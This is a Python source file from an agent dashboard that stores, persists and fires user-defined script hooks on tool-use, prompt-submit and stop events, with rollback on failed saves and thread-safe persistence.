        """Undo the in-memory change if persistence fails.

        ``_save`` refuses to overwrite an unreadable ``hooks.json`` rather than
        erasing the webhook contexts kept in the same file, and the write itself
        can fail on a full or read-only disk. Every mutation below edits
        ``self._hooks`` first, so without this the process would keep serving a
        change that never reached disk — a hook toggled on would keep firing, a
        deleted one would keep existing — while the API reported 503.

        A deep copy is used because ``update`` and ``toggle`` mutate the stored
        ``ScriptHook`` in place; a shallow dict copy would share those objects and
        restore nothing. The set is small (tens of hooks), so the copy is cheap
        next to the fsync it guards.
        """
        snapshot = copy.deepcopy(self._hooks)
        try:
            yield
        except BaseException:
            self._hooks = snapshot
            raise

    def create(self, data: dict) -> ScriptHook:
        hook = ScriptHook.from_dict(data)
        if not hook.id:
            hook.id = str(uuid.uuid4())[:8]
        with self._mutex, self._atomic_mutation():
            self._hooks[hook.id] = hook
            self._save()
        return hook

    def update(self, hook_id: str, data: dict) -> ScriptHook | None:
        with self._mutex, self._atomic_mutation():
            hook = self._hooks.get(hook_id)
            if not hook:
                return None
            if "event" in data and data["event"] not in HOOK_EVENTS:
                raise ValueError(f"invalid event: {data['event']}")
            if "timeout" in data:
                t = data["timeout"]
                if not isinstance(t, int) or not (1 <= t <= 300):
                    raise ValueError("timeout must be an integer between 1 and 300")
            for k in ("name", "event", "matcher", "command", "timeout", "enabled"):
                if k in data:
                    setattr(hook, k, data[k])
            self._save()
        return hook

    def delete(self, hook_id: str) -> bool:
        with self._mutex, self._atomic_mutation():
            if hook_id in self._hooks:
                del self._hooks[hook_id]
                self._save()
                return True
        return False

    def toggle(self, hook_id: str) -> ScriptHook | None:
        with self._mutex, self._atomic_mutation():
            hook = self._hooks.get(hook_id)
            if not hook:
                return None
            hook.enabled = not hook.enabled
            self._save()
        return hook

    async def fire(
        self,
        event: str,
        context: str = "",
        tool_name: str = "",
        tool_input: dict | None = None,
        tool_response: dict | None = None,
        subagent_id: str | None = None,
        parent_session_key: str | None = None,
        agent_role: str | None = None,
    ) -> list[ScriptHookResult]:
        """Fire all enabled hooks matching the given event. Returns results.

        For PreToolUse/PostToolUse, matcher filters by tool name.
        For AgentSpawn/UserPromptSubmit/Stop, all hooks for that event fire.

        Optional ``subagent_id``, ``parent_session_key``, and ``agent_role`` are
        emitted into the hook_event payload so hook scripts can attribute tool
        calls to the specific agent/session that fired them. Parent contexts
        (dashboard chat, generic LLM helpers) leave them as ``None``.

        For the Stop event, the full ``context`` (the final assistant segment) is
        used for matcher evaluation and echoed to stdin as ``assistant_text``;
        only the ``KIROCREW_HOOK_CONTEXT`` env var is length-capped downstream in
        ``run_script_hook`` (ARG_MAX safety), so a hook keying on the tail of the
        segment reads it from stdin JSON rather than the truncated env var.
        """
        import os

        results = []
        # Build base hook event (Kiro CLI format)
        hook_event: dict = {"hook_event_name": event, "cwd": os.getcwd()}
        if event == HOOK_EVENT_USER_PROMPT_SUBMIT and context:
            hook_event["prompt"] = context
        elif event == HOOK_EVENT_STOP:
            # Echo the final assistant segment to stdin so a hook keying on the
            # tail — e.g. the harness [OPTIONS:] line, past the env var's cap —
            # reads the whole thing here rather than the truncated env var.
            # Unconditional (even when "") so an empty/no-output Stop turn still
            # carries the key and a hook that always reads it never KeyErrors.
            hook_event["assistant_text"] = context
        if tool_name:
            hook_event["tool_name"] = tool_name
        if tool_input is not None:
            hook_event["tool_input"] = tool_input
        if tool_response is not None:
            hook_event["tool_response"] = tool_response
        if subagent_id:
            hook_event["subagent_id"] = subagent_id
        if parent_session_key:
            hook_event["parent_session_key"] = parent_session_key
        if agent_role:
            hook_event["agent_role"] = agent_role

        for hook in list(self._hooks.values()):
            if not hook.enabled or hook.event != event:
                continue
            # Matcher filtering: for tool hooks, match tool name; for others, match context
            if hook.matcher:
                if event in (HOOK_EVENT_PRE_TOOL_USE, HOOK_EVENT_POST_TOOL_USE):
                    if not _tool_matches(hook.matcher, tool_name):
                        continue
                elif context and not fnmatch.fnmatch(context.lower(), hook.matcher.lower()):
                    continue
            result = await run_script_hook(hook, context, hook_event)
            results.append(result)
            logger.info(
                "Hook %s (%s): %s in %dms (exit=%d)",
                hook.name,
                event,
                hook.last_status,
                result.duration_ms,
                result.exit_code,
            )
        # Snapshot INSIDE the worker under the mutex, not here: capturing on the
        # loop and persisting later leaves the same interleaving window a
        # concurrent CRUD mutation could fall into.
        await asyncio.to_thread(self._persist_current)
        return results

    def _persist_current(self) -> None:
        """Persist the live hook set, serialised against CRUD mutations.

        This path only records status bookkeeping after a fire; the hook set
        itself is unchanged. `_save` refuses to write over an unreadable
        `hooks.json` so it cannot destroy the webhook contexts sharing that
        file, but that refusal must not propagate here: `fire()` is awaited
        from the PRE_TOOL_USE path, which turns an exception into a rejected
        tool call, so a corrupt file would block every tool call in dashboard
        chat until an operator repaired it. Log and continue instead. The CRUD
        paths keep failing loud, where losing the write does change the hook set.
        """
        with self._mutex:
            try:
                self._save()
            except (webhooks.WebhookStoreUnreadable, OSError) as exc:
                logger.warning(
                    "Could not persist hook status bookkeeping: %s. "
                    "Hook execution continues; %s needs repair before "
                    "hook edits can be saved.",
                    exc,
                    self._path,
                )

    def _save_snapshot(self, hooks_data: list[dict]) -> None:
        """Thread-safe save using pre-captured hook snapshot."""
        with self._mutex:
            self._write_hooks_file(hooks_data)


# -- Global script hook store accessor --
# Set by dashboard server.py / handlers.py when the store is initialized.
# Allows any module (task_executor, llm_helpers, subagent) to fire script hooks
# without needing a reference to DashboardState.

_global_script_hook_store: ScriptHookStore | None = None


def set_global_hook_store(store: ScriptHookStore) -> None:
    """Register the global script hook store."""
    global _global_script_hook_store
    _global_script_hook_store = store


def get_global_hook_store() -> ScriptHookStore | None:
    """Get the global script hook store, or None if not initialized."""
    return _global_script_hook_store


async def fire_tool_hooks(
    hook_store: ScriptHookStore | None,
    event_title: str,
    event_tool_input: str | None = None,
    subagent_id: str | None = None,
    parent_session_key: str | None = None,
    agent_role: str | None = None,
) -> None:
    """Fire PreToolUse hooks for an EVENT_TOOL_CALL event.

    PostToolUse is NOT fired here because EVENT_TOOL_CALL is a notification
    that the tool is starting - the tool hasn't completed yet. PostToolUse
    should be fired on EVENT_TOOL_RESULT when available.

    Note: For EVENT_TOOL_CALL, hooks are informational only. The tool is
    already running (auto-approved by kiro-cli), so hook results cannot
    block execution. Hook scripts can log, audit, or trigger side effects.

    Optional ``subagent_id``, ``parent_session_key``, and ``agent_role`` are
    forwarded to the underlying hook_store so hook scripts can attribute
    tool calls to the specific agent/session that fired them. Callers in
    parent contexts (dashboard chat, generic LLM helpers) leave them as
    ``None``; subagent and taskrunner callers pass real values.
    """
    if hook_store is None:
        return
    tool_name = event_title or ""
    if tool_name.startswith("Running: "):
        tool_name = tool_name[9:]
    tool_input = None
    if event_tool_input:
        try:
            tool_input = json.loads(event_tool_input)
        except Exception:
            pass
    try:
        await hook_store.fire(
            HOOK_EVENT_PRE_TOOL_USE,
            tool_name=tool_name,
            tool_input=tool_input,
            subagent_id=subagent_id,
            parent_session_key=parent_session_key,
            agent_role=agent_role,
        )
    except Exception:
        logger.debug("PreToolUse hook error", exc_info=True)
